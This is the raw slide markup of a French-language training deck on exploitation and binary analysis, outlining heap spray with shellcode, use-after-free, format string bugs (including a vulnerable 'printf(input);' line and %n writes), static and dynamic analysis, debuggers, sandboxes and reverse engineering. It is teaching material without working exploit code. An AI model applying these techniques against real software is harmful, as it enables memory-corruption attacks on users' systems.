            <a:ext cx="7772400" cy="265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344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576B5-7A09-FD77-4E72-00049D85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 b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploitation des Heap Overflows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1AD3C6-5190-2CFF-E768-B5775235FB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4980633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681264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A500-FEF5-39D5-FFF4-906BD1A2B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Heap Spray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4F32E-B099-4446-FE96-50499D2AB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Principe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Technique </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’allocation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> massive de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>remplir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la heap avec un shellcode.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Impact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Facilite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>prévisibilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>adresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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Exemple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Utilisation dans les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>navigateurs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour exploiter des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans JavaScript.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24043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B44AF-FBBF-196B-8BDE-31BCB2A7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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de Heap Spray (JavaScript)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1AE67-1932-D4ED-FAAD-95254D204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Utilisation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’objets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mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour placer un shellcode :</a:t>
            </a:r>
          </a:p>
          <a:p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28DA2-30A2-1723-32AF-FA2B7D117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983503"/>
            <a:ext cx="7772400" cy="331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4860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C9FA-117F-5291-83A9-731CCB622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After Free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C0EF5-D7E7-0B40-2375-7E889B14E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Principe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Utilisation d’un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>pointeur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vers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zone </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>libérée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Impact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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réutiliser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>injecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillantes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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (C++) :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2DE096-37E7-CF1B-0F87-8915955D0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83" y="4372788"/>
            <a:ext cx="7772400" cy="287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5611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4215-FF68-A93F-3464-A9E695F7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Exploitation du Use After Free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90B5F-B120-0488-A82B-D9A500229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Techniques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Remplacement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contenu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>libéré</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par du shellcode.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Manipulation des structures internes pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rediriger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pratique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Exploitation des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>objets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>navigateurs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977175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E75D6-0FBC-1874-1D08-36C5C4C1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Format String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65410-8F39-895F-DE9E-E55F42EE2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Principe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Mauvaise</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> gestion des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>formatage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>printf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sprintf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>Exemple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> C: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t>printf(input);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/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Impact :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Lecture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écriture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>arbitraire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mémoire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634262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575F-28E7-4F31-E027-32E5471C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Exploitation des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>vulnérabilités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de format string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22FE1-5A42-75D1-3EC0-75A7CD066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Techniques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Lecture de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> avec %x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> %s.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Écriture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mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via %n.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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>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Modifier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adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> critique via %n.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681693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D7C4C-9886-9680-9A0E-4BB0F4E69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Analyse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>statique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Définition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86334-742C-A775-2107-E23D10D19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Principe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Examiner un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécuter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Objectifs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Comprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du programme.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Identifier les sections </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>importantes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (code, data).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Décoder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>algorithmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et structures </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utilisées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773958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A07176-37F7-195E-03C3-A5D6185C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Outils d’analyse statique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A2B101-9049-EE3C-9E8C-E62842E31E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118467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033474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D12D5-CB3E-9A41-E5CF-C1C5A0D40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Processus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>statique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DE604-3BF0-EE17-483E-7C9A2E791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/>
              <a:t>Charger le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> dans un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>désassembleur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>.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Identifier les entrées </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>principales</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (main, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>WinMain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, _</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>init</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, _entry…).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Cartographier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> les sections du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>fichier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>.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.text, .data, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>bss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rdata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Analyser les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>appels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> API.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Recherche de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sensibles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>CreateProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>VirtualAlloc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Reverser les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>algorithmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>.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Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Décryptage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de données </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>statiques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41002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1B10C-3916-59CC-3C9F-761D3FE20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Avantages et inconvénients de l’analyse statique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AFF5F3-F69D-603D-0A59-507431F2C7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0784238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483676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8326-6B9A-1A36-8A65-03A47B687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Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamiques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7D16D-EA4D-44DC-3B95-5CBAE08E8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Principe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Observer le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du programme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l'exécutant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>environnement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contrôlé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Objectifs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Identifier les actions du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire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Découvrir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>cachés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conditionnels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Analyser les interactions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fichiers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, réseau, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>).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897681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89D77-BAC1-7B2D-986C-060462ED3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Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamique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7FF55-E01A-229E-818F-C03B2F977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Débogueurs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OllyDbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, x64dbg, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>WinDbg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Analyse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>mémoire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Process Hacker, Volatility.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Suivi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> des API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API Monitor, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Sysinternals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Suite (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Procmon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Monitoring global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Cuckoo Sandbox, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Any.Run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356774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73C67-EADF-9814-6F42-AC2FBDA21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1"/>
            <a:ext cx="9144000" cy="869092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Processus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamique</a:t>
            </a:r>
            <a:endParaRPr lang="fr-F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FD0AEA-4F83-32A1-E73C-80B55A38A2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9836581"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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719841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2AC0-0230-D0BA-7D27-69EBBD658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Avantages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>inconvénients</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’analyse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dynamique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4F459-4D83-8242-4496-A10D65C86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Avantages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Permet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>révéler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>conditionnels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (ex. : payloads).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Utile pour analyser les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>obfusqués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Inconvénients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Risque de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (anti-debug).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Nécessite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>environnement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sécurisé</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty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802317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02FCE-FB05-6320-2317-0B74AF6A9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762001"/>
            <a:ext cx="9144000" cy="869092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GB" sz="2400"/>
              <a:t>La </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400" err="1"/>
              <a:t>sécurité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2400"/>
              <a:t> dans le bac à sable (sandboxing)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="24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FE2C8E-A9A1-785A-91F5-D2B54A29F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4670657"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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547663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D33C-74F6-D7BA-40A4-1D2004D2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Outils</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de sandboxing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DB2B9-EB1F-15EB-30F7-CE9F727A0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Plates-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>formes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Cuckoo Sandbox : Analyse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>automatisée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>logiciels</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillants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Any.Run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : Analyse interactive.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Virtualisation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VirtualBox, VMware.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Solutions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>commerciales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FireEye, Joe Sandbox.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963835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15A08-3926-9018-C683-DC41898A2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Avantages</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> du sandboxing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3CDCC-7D0E-5BD9-48D6-5D39CF01D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Sécurité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Préserve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>système</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>hôte</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des actions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>malveillantes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Facilité</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>d’analyse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Automatisation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la capture des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportements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Limites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Détection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> possible par le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire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Certains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> malwares </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>détectent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>environnements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>virtuels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36179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7B5B00-70C4-B2C5-D131-E2A1E856D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 b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reverse Engineering - Définition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58EAAE-CCEB-E84E-BD7D-A4DE0D984E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9850666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906235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5337-89AA-60D5-301C-0C9F4FED9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Débogage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pas à pas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7B720-8C12-A14B-0279-05E779BCF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Outils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OllyDbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, x64dbg, GDB.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Étapes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Charger le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>binaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>débogueur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Placer des points </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d’arrêt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Exécuter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> étape par étape.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Inspecter les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>registres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> et la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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066504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85E67-DFB1-D5D1-4033-D902EA04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Techniques de Reverse Engineering</a:t>
            </a:r>
